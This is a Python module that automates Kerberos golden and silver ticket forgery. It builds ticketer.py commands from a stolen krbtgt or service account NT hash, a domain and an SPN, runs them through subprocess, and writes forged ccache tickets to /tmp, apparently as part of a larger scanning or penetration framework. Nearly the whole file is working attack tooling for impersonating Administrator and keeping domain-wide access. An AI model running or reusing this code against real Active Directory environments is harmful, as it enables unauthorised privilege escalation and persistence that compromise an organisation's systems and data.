"""
Golden/Silver Ticket Automation Module
"""
import os, re, json, subprocess, base64
from datetime import datetime, timedelta
from enum import Enum
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional

class TicketType(Enum):
    GOLDEN = "golden"
    SILVER = "silver"

class TicketStatus(Enum):
    FORGED = "forged"
    FAILED = "failed"

@dataclass
class ForgedTicket:
    ticket_type: str
    target_user: str
    target_domain: str
    target_service: str
    target_host: Optional[str]
    forged_at: str
    valid_until: str
    ticket_file: str
    status: str
    scan_id: int
    commands_used: List[str] = field(default_factory=list)

class GoldenTicketForger:
    def __init__(self, scan_id: int):
        self.scan_id = scan_id
    
    def forge(self, krbtgt_hash: str, domain: str, target_user: str = "Administrator") -> ForgedTicket:
        ticket_file = f"/tmp/golden_{target_user}.ccache"
        cmd = f"python3 ticketer.py -nthash {krbtgt_hash} -domain {domain} -target {target_user} -output {ticket_file}"
        try:
            subprocess.run(cmd.split(), capture_output=True, timeout=30)
            return ForgedTicket(
                ticket_type='golden', target_user=target_user, target_domain=domain,
                target_service='krbtgt', target_host=None, forged_at=datetime.now().isoformat(),
                valid_until=(datetime.now() + timedelta(hours=10)).isoformat(),
                ticket_file=ticket_file, status='forged', scan_id=self.scan_id, commands_used=[cmd]
            )
        except:
            return ForgedTicket(
                ticket_type='golden', target_user=target_user, target_domain=domain,
                target_service='krbtgt', target_host=None, forged_at=datetime.now().isoformat(),
                valid_until='', ticket_file='', status='failed', scan_id=self.scan_id, commands_used=[cmd]
            )

class SilverTicketForger:
    def __init__(self, scan_id: int):
        self.scan_id = scan_id
    
    def forge(self, service_hash: str, domain: str, target_service: str, target_host: str) -> ForgedTicket:
        ticket_file = f"/tmp/silver_{target_service}.ccache"
        spn = f"{target_service}/{target_host}.{domain}"
        cmd = f"python3 ticketer.py -nthash {service_hash} -domain {domain} -spn {spn} -output {ticket_file}"
        try:
            subprocess.run(cmd.split(), capture_output=True, timeout=30)
            return ForgedTicket(
                ticket_type='silver', target_user='Administrator', target_domain=domain,
                target_service=target_service, target_host=target_host, forged_at=datetime.now().isoformat(),
                valid_until=(datetime.now() + timedelta(hours=10)).isoformat(),
                ticket_file=ticket_file, status='forged', scan_id=self.scan_id, commands_used=[cmd]
            )
        except:
            return ForgedTicket(
                ticket_type='silver', target_user='Administrator', target_domain=domain,
                target_service=target_service, target_host=target_host, forged_at=datetime.now().isoformat(),
                valid_until='', ticket_file='', status='failed', scan_id=self.scan_id, commands_used=[cmd]
            )

class KerberosTicketEngine:
    def __init__(self, scan_id: int):
        self.scan_id = scan_id
        self.golden = GoldenTicketForger(scan_id)
        self.silver = SilverTicketForger(scan_id)
    
    def analyze_hash(self, hash_str: str) -> Dict:
        is_krbtgt = 'krbtgt' in hash_str.lower()
        return {'is_krbtgt': is_krbtgt, 'type': 'golden' if is_krbtgt else 'silver'}
    
    def forge_golden(self, hash_str: str, domain: str) -> ForgedTicket:
        nt_hash = hash_str.split(':')[-1] if ':' in hash_str else hash_str
        return self.golden.forge(nt_hash, domain)
    
    def forge_silver(self, hash_str: str, domain: str, service: str, host: str) -> ForgedTicket:
        nt_hash = hash_str.split(':')[-1] if ':' in hash_str else hash_str
        return self.silver.forge(nt_hash, domain, service, host)